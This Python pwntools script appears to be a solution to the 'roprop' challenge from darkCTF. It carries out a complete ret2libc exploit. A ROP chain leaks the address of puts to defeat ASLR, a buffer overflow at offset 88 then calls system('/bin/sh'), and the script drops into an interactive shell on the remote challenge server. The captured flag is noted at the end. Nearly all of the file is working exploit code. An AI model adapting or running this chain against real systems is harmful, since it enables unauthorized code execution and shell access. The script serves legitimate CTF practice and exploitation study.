"""
Standard ret2libc
"""

from pwn import *

binary_path = "./roprop"
#lib_path = "/lib/x86_64-linux-gnu/"
lib_path = "./lib/"

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break main

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc roprop.darkarmy.xyz 5002
        return remote("roprop.darkarmy.xyz", 5002)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})

io = start()

rop = ROP(elf);
rop.puts(elf.got.puts)
rop.main()

io.recvuntil("19's")
io.clean()

io.sendline(flat({
    88: rop.chain()
}))

puts_addr = u64(io.recvline()[:-1].ljust(8, b"\0"))
libc.address = puts_addr - libc.sym.puts
print(f"LIBC: {hex(libc.address)}")

binsh_addr = next(libc.search(b"/bin/sh\0"))

rop = ROP(libc)
rop.raw(0x0000000000400646)
rop.system(binsh_addr)
rop.exit()

io.sendline(flat({
    88: rop.chain()
}))

io.interactive()

# darkCTF{y0u_r0p_r0p_4nd_w0n}
